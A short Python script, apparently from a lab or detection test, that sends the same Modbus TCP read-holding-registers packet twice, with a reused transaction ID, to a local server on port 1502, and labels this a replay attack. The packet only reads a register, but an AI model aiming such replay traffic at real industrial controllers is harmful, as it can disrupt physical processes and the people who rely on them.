import socket
import binascii
import time

# Same transaction ID reused intentionally
hex_packet = "00 05 00 00 00 06 01 03 00 10 00 01"
packet = binascii.unhexlify(hex_packet.replace(" ", ""))

print("[*] Sending replay attack packets...")

for i in range(2):  # send same packet twice
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 1502))
    sock.sendall(packet + b"\r\n")
    sock.recv(1024)
    sock.close()
    time.sleep(0.3)

print("[✓] Replay attack completed")
